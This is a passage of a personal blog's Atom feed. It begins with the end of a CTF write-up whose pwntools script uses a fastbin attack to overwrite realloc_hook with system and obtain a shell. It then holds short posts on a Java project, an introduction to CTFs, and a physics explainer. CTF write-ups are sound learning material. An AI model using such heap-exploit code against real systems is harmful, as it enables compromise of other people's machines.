+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x71&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3c4aed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;#4 #overwrite next ptr of fastbin 0x70&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;#5&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# overwritting realloc_hook&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;heap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getleak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;And on running the exploit-&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/memoheap/memoheap.png&quot; alt=&quot;memo_heap&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Had lots of fun solving this challenge. The CTF itself was pretty good with lots of decent quality challenges. Thanks for reading through!&lt;/p&gt;</content><author><name></name></author><category term="writeup" /><category term="fastbin" /><category term="heap" /><summary type="html">Fastbin attack</summary></entry><entry><title type="html">Student Diary</title><link href="http://localhost:4000/studentdiary/" rel="alternate" type="text/html" title="Student Diary" /><published>2017-11-01T00:00:00+05:30</published><updated>2017-11-01T00:00:00+05:30</updated><id>http://localhost:4000/studentdiary</id><content type="html" xml:base="http://localhost:4000/studentdiary/">&lt;p class=&quot;notice&quot;&gt;Main File: StudentDiary.class&lt;br /&gt;
+Link: &lt;a href=&quot;https://github.com/vigneshsrao/Student-Diary&quot; target=&quot;blank&quot;&gt;github.com/vigneshsrao/Student-Diary&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;This is a simple Java application to keep track of student data. It was implemented in order to understand the fundamentals of Object-Oriented-Programming.&lt;/p&gt;
+
+&lt;p&gt;As of now the data is being stored in files and not in a database. Also this application has been immplemented to be used as a command line application.&lt;/p&gt;
+
+&lt;h2 id=&quot;features&quot;&gt;Features&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Keeps track of the following student data:
+    &lt;ul&gt;
+      &lt;li&gt;Courses - total and enrolled&lt;/li&gt;
+      &lt;li&gt;Remarks&lt;/li&gt;
+      &lt;li&gt;Achievements&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Excellent error handling&lt;/li&gt;
+  &lt;li&gt;Easy manipulation of data&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="Java" /><category term="Development" /><category term="Project" /><summary type="html">Java application to keep track of student data</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/projects/studentdiary/logo.png" /></entry><entry><title type="html">Cyber Security</title><link href="http://localhost:4000/cyber-srcurity/" rel="alternate" type="text/html" title="Cyber Security" /><published>2016-12-14T00:00:00+05:30</published><updated>2016-12-14T00:00:00+05:30</updated><id>http://localhost:4000/cyber-srcurity</id><content type="html" xml:base="http://localhost:4000/cyber-srcurity/">&lt;p&gt;Cyber Security is the field of computer science that deals with protecting data, providing safety against external attacks, protecting our system against viruses and malware’s and even finding and exploiting loopholes in various websites, programs, systems etc. In the present age, where computers are being used in almost every walk of life, computer security is critical.&lt;/p&gt;
+
+&lt;p&gt;Even though there is a major demand for Computer Science and Engineering in India, there is, surprisingly, a real shortage of cyber security experts in the country. This can be attributed to people’s lack of knowledge about the field. In many countries children are trained in security while they are as young as 13 years.&lt;/p&gt;
+
+&lt;p&gt;Due to the lack of people working in this field, and its high importance in the present world, Cyber Security is currently a hot topic in computer science and if you are an expert in this field then its practically guaranteed that you will land up with an excellent job. But a person becomes an expert in the field, only if he/she has interest, passion and dedication for the field. Many have the doubt “But I don’t even know the ABCD of computers. Then how am I ever going to be good in a topic like Cyber Security ?”. Don’t worry. All you need, like I said before, is interest, passion and dedication. The rest will fall in place automatically if these essential ingredients are already present.&lt;/p&gt;
+
+&lt;p&gt;There are mainly five subdivisions of Cyber Security, namely – Reverse Engineering, Binary Exploitation, Web Exploitation, Cryptography and Forensics. Besides these there are also many more topic within Cyber Security like Hardware Security, Kernel Exploitation etc. I am myself a newbie in this field and the way I got started  with  Cyber Security was with playing picoctf, a beginner level CTF.&lt;/p&gt;
+
+&lt;p&gt;A Capture The Flag (CTF) is a Security Contest in which the player will be presented with many challenges (questions). The aim of each challenge is to get a flag which is usually a random string for example – flag{yez_you_hav3_g0t_1t}. When the flag is submitted points are gained and the team with the maximum number of points at the end of the stipulated time, wins the CTF. The challenges are usually divided into the above mentioned subdivisions. Solving a challenge requires presence of mind, some problem solving skills, knowledge of some tools and of course some knowledge about the topic on which the challenge is based upon.&lt;/p&gt;
+
+&lt;p&gt;If you are also looking to try out Cyber Security then I would recommend you to start by playing picoctf. You can register as an individual. The beginning challenges would be pretty easy (maybe converting hex to decimal or viewing source code of a webpage  :)). But as you progress with the game, the challenges will keep getting harder and you will need to do some research on the topic before you solve the challenge. But keep trying and don’t give up and definitely DON’T google for solutions :).&lt;/p&gt;
+
+&lt;p&gt;As you get on with picoctf you will eventually find out that the problems of one of the subdivisions interests you more than the others. This is the topic that you should pursue for at least a year or two. Here is a basic description of the five main subdivisions of Cyber Security –&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Reverse Engineering – it deals with finding out the source code of a program whose executable is provided.&lt;/li&gt;
+  &lt;li&gt;Binary Exploitation – it deals with exploiting the vulnerabilities (loopholes) that are present in the program.&lt;/li&gt;
+  &lt;li&gt;Web Exploitation – it mainly deals with finding vulnerabilities within webpages and  thus attacking the webpage via the vulnerability.&lt;/li&gt;
+  &lt;li&gt;Cryptography – it is the study of various encryption techniques and decrypting a given encrypted text.&lt;/li&gt;
+  &lt;li&gt;Forensics – it is the application of various techniques to gather evidence that can be presented in court.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Now go on and try out Cyber Sec ;). Don’t be afraid to try. If you find that its not your cup of tea then you always can drop out later. But try it. The thrill that you will get after solving a challenge will be worth all the effort that you had put in and all the frustration that you had to overcome, believe me.&lt;/p&gt;
+
+&lt;p&gt;I request everyone reading this post to voice their comments about this post and of course any suggestion’s are always welcome.&lt;/p&gt;
+
+&lt;p&gt;Thanks for having the patience to read this. Hope it was useful.&lt;/p&gt;</content><author><name></name></author><category term="Experience" /><category term="security" /><category term="Non-tech" /><summary type="html">Introduction to Cyber Security</summary></entry><entry><title type="html">Ever Wondered Why Black Is Warm And White Is Cool ?</title><link href="http://localhost:4000/hot-cool/" rel="alternate" type="text/html" title="Ever Wondered Why Black Is Warm And White Is Cool ?" /><published>2016-11-30T00:00:00+05:30</published><updated>2016-11-30T00:00:00+05:30</updated><id>http://localhost:4000/hot-cool</id><content type="html" xml:base="http://localhost:4000/hot-cool/">&lt;p&gt;You might have observed many times that  on hot and sunny days, while wearing a dark colored shirt and a light colored pant, the upper part of your body feels comparatively warmer than your lower part. So why does this happen ? How in the world can colors make us feel warmer than we are ?&lt;/p&gt;
+
+&lt;p&gt;The answer lies in the fact that the frequency ,ν, of different colors is different. Also it is important to know how objects acquire their colors. A red colored object is so colored because it reflects red color while absorbing every other color of white light. Similarly a white object reflects all colors while a black object absorbs all colors and reflects none.&lt;/p&gt;
+
+&lt;p&gt;The energy associated with a ray of frequency, ν, is hν where h is Planck’s constant. So a light ray with higher frequency has higher energy than that with lower frequency. In the visible spectra frequency decreases in the order violet, indigo, blue, green, yellow, orange, red. So violet has the highest frequency while red has the lowest. Accordingly violet color has the maximum energy and red has the minimum.&lt;/p&gt;
+
+&lt;p&gt;When white light falls on a red colored object, all colors are absorbed except red. From the Law of Conservation of energy (hν) of each color of absorbed light is transferred to the object as heat. Since a red object reflects the ray with lowest frequency and thus lowest energy, it absorbs a high amount of energy (heat) from the absorbed colors and thus becomes very hot. A black object absorbs all colors of the visible spectra and thus absorbs the maximum amount of heat energy. Thus black is considered the warmest color. A white object reflects all colors and thus absorbs almost no heat energy. So white is the coolest color.&lt;/p&gt;</content><author><name></name></author><category term="Experience" /><category term="Non-tech" /><summary type="html">Why darker objects are considered to be warner than lighter ones</summary></entry></feed>
